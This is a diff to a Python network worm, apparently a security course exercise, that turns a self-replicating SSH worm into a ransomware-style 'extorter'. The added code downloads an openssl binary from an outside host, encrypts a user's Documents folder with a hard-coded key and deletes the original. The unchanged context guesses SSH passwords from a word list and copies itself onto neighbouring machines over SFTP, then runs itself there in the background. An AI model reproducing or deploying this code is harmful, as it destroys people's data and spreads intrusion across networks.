@@ -5,8 +5,11 @@ import os
 import os.path
 import socket, fcntl, struct
 import netifaces
+import urllib
+from subprocess import call
+import shutil
 
-markerLocation = "/tmp/marker.txt"
+markerLocation = "/tmp/marker_extort.txt"
 
 wordList = [
 ('awesomeUserName', 'badPassword'),
@@ -117,8 +120,22 @@ def attackHost(host):
 	return None
 
 
+def encryptVictim():
+	call(["chmod", "a+x", "./openssl"])
+	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "/home/ubuntu/Documents", "-out", "/home/ubuntu/Documents.enc", "-k", "cs456worm"])
+	shutil.rmtree('/home/ubuntu/Documents/')
+
+
 
 markSystem();
+
+if sys.argv[1] == "-host":
+	print("Will mark and spread worm but won't encrypt Documents folder")
+else:
+	urllib.urlretrieve("ecs.fullerton.edu/~mgofman/openssl")
+	encryptVictim()
+
+
 network = getHostsOnTheSameNetwork()
 
 print network
@@ -137,9 +154,9 @@ for Host in network:
 			print("Spreading to this machine: %s" %(str(Host)))
 			try:
 				sftpClient = sshInfo[0].open_sftp()
-				sftpClient.put("replicating_worm.py", "/tmp/" + "replicating_worm.py")
-				sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
-				sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py &")
+				sftpClient.put("extorter_worm.py", "/tmp/" + "extorter_worm.py")
+				sshInfo[0].exec_command("chmod a+x /tmp/extorter_worm.py")
+				sshInfo[0].exec_command("nohup python /tmp/extorter_worm.py &")
 			except:
 				print ("Something went wrong")
 
